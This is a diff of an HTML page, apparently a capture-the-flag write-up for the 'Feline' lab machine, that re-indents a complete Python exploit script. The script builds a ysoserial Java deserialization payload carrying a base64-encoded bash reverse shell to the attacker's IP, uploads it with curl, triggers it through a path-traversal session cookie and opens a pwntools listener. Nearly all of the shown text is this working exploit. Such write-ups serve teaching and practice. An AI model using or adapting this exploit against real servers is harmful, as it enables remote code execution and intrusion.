@@ -81,75 +81,74 @@ body {
 	 From here we have all the pieces we need to create a python script to exploit.																<br/> <br/> <br/>
 	 <img src="images/feline/user-txt.PNG" alt="User.txt" class="inline"/> 
 	 
-	 <h4><i>User.py</i></h4>																						<br/>
-
+<h4><i>User.py</i></h4>																						
 <pre>
-#!/usr/bin/python3
+	#!/usr/bin/python3
 
-import base64
-from pwn import *
-from termcolor import colored
+	import base64
+	from pwn import *
+	from termcolor import colored
 
-my_ip = "10.10.14.254"
-my_port = "9000"
-ysoserial_path = '/opt/ysoserial-master-6eca5bc740-1.jar'
-upload_url = 'http://feline.htb:8080/upload.jsp'
-
-
-# Helper func to generate random filename
-def get_random_string(length):
-    letters = string.ascii_lowercase
-    result_str = ''.join(random.choice(letters) for i in range(length))
-    return result_str
+	my_ip = "10.10.14.254"
+	my_port = "9000"
+	ysoserial_path = '/opt/ysoserial-master-6eca5bc740-1.jar'
+	upload_url = 'http://feline.htb:8080/upload.jsp'
 
 
-# Helper func to run bash
-def run_bash(cmd):
-    print(colored('\n' + str(cmd), 'green')) 
-    p = process(cmd, shell=True)
-    err = p.recvall()
-    exit_code = p.poll()
-    if exit_code == 0:
-        print(colored('[+] Success', 'green'))
-        print('\n')
-    else:
-        print(colored('[-] Failed with exit code ' + str(exit_code), 'red'))
+	# Helper func to generate random filename
+	def get_random_string(length):
+    	letters = string.ascii_lowercase
+    	result_str = ''.join(random.choice(letters) for i in range(length))
+    	return result_str
 
 
-# Generate a random 6 character filename to use
-fname = get_random_string(6).capitalize()
+	# Helper func to run bash
+	def run_bash(cmd):
+    	print(colored('\n' + str(cmd), 'green')) 
+    	p = process(cmd, shell=True)
+    	err = p.recvall()
+    	exit_code = p.poll()
+    	if exit_code == 0:
+        	print(colored('[+] Success', 'green'))
+        	print('\n')
+    	else:
+        	print(colored('[-] Failed with exit code ' + str(exit_code), 'red'))
 
 
-# Create our .session file with JRE command from 
-# http://jackson-t.ca/runtime-exec-payloads.html
-cmd = 'bash -i >& /dev/tcp/' + my_ip + '/' + my_port + ' 0>&1'
-b = bytes(cmd, 'utf-8')
-enc = base64.b64encode(b)
-encoded = enc.decode('ascii')
-jre_cmd = 'bash -c {echo,' + encoded + '}|{base64,-d}|{bash,-i}'
-serialize_cmd = 'java -jar ' + ysoserial_path + ' CommonsCollections2 ' + '\"' + jre_cmd + '\" > ' + fname + '.session'
-run_bash(serialize_cmd)
+	# Generate a random 6 character filename to use
+	fname = get_random_string(6).capitalize()
 
 
-# Attempt to upload payload
-cmd = 'curl -sS ' + '\'' + upload_url + '\'' + ' -F \"image=@' + fname + '.session\" > /dev/null' 
-run_bash(cmd)
+	# Create our .session file with JRE command from 
+	# http://jackson-t.ca/runtime-exec-payloads.html
+	cmd = 'bash -i >& /dev/tcp/' + my_ip + '/' + my_port + ' 0>&1'
+	b = bytes(cmd, 'utf-8')
+	enc = base64.b64encode(b)
+	encoded = enc.decode('ascii')
+	jre_cmd = 'bash -c {echo,' + encoded + '}|{base64,-d}|{bash,-i}'
+	serialize_cmd = 'java -jar ' + ysoserial_path + ' CommonsCollections2 ' + '\"' + jre_cmd + '\" > ' + fname + '.session'
+	run_bash(serialize_cmd)
 
 
-# Startup pwntools listener
-print(colored('Starting nc listener', 'green'))
-l = listen(my_port)
-print(colored('[+] Success', 'green'))
+	# Attempt to upload payload
+	cmd = 'curl -sS ' + '\'' + upload_url + '\'' + ' -F \"image=@' + fname + '.session\" > /dev/null' 
+	run_bash(cmd)
 
 
-# Execute payload
-cmd = 'curl -sS ' + '\'' + upload_url + '\'' + ' -H \"Cookie: JSESSIONID=../../../opt/samples/uploads/' + fname + '\" > /dev/null'
-run_bash(cmd)
+	# Startup pwntools listener
+	print(colored('Starting nc listener', 'green'))
+	l = listen(my_port)
+	print(colored('[+] Success', 'green'))
 
 
-# Interact with our listener
-l.interactive()
-</pre>
+	# Execute payload
+	cmd = 'curl -sS ' + '\'' + upload_url + '\'' + ' -H \"Cookie: JSESSIONID=../../../opt/samples/uploads/' + fname + '\" > /dev/null'
+	run_bash(cmd)
+
+
+	# Interact with our listener
+	l.interactive()
+	</pre>
 	 
 	 
 	 
